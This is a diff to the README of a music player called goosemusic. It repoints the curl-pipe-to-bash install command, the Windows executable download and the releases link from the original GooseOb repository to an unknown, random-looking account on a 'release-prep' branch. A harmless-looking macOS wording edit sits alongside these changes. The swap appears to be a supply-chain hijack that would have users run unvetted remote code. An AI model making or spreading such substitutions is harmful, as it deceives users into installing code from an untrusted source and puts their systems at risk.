@@ -68,18 +68,18 @@ This is a focused fork branch for testing the TinySkia configuration; it does no
 ### Quick install (Linux / macOS)
 
 ```sh
-curl -fsSL https://raw.githubusercontent.com/GooseOb/music_plr/master/scripts/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/awfghHJVBKLDHIOWAEFGUH/music_plr/release-prep/tiny-skia-v1.5.1/scripts/install.sh | bash
 ```
 
 Detects your platform, downloads the latest release, and installs everything. On Linux it also sets up the desktop entry and icon.
 
 ### Windows
 
-Download the [latest release](https://github.com/GooseOb/music_plr/releases/latest/download/goosemusic-x86_64-pc-windows-msvc.zip) and extract to a folder. Run `goosemusic.exe`.
+Download the [latest release](https://github.com/awfghHJVBKLDHIOWAEFGUH/music_plr/releases/latest/download/goosemusic-x86_64-pc-windows-msvc.zip) and extract to a folder. Run `goosemusic.exe`.
 
 ### Manual install
 
-Download from [GitHub releases](https://github.com/GooseOb/music_plr/releases) or compile from source:
+Download from [GitHub releases](https://github.com/awfghHJVBKLDHIOWAEFGUH/music_plr/releases) or compile from source:
 
 ```sh
 cargo install goosemusic
@@ -97,7 +97,7 @@ cp icons/logo.svg ~/.local/share/icons/goosemusic.svg
 
 #### macOS
 
-Extract the `.app.tar.gz` and drag `Goosemusic.app` to your Applications folder. On first open, right-click → Open if macOS blocks it (unsigned app).
+Open the architecture-matched `.dmg` and drag `Goosemusic.app` to Applications, or extract the portable `.app.tar.gz` archive. On first open, right-click → Open if macOS blocks it (unsigned app).
 
 ## Supported languages
 
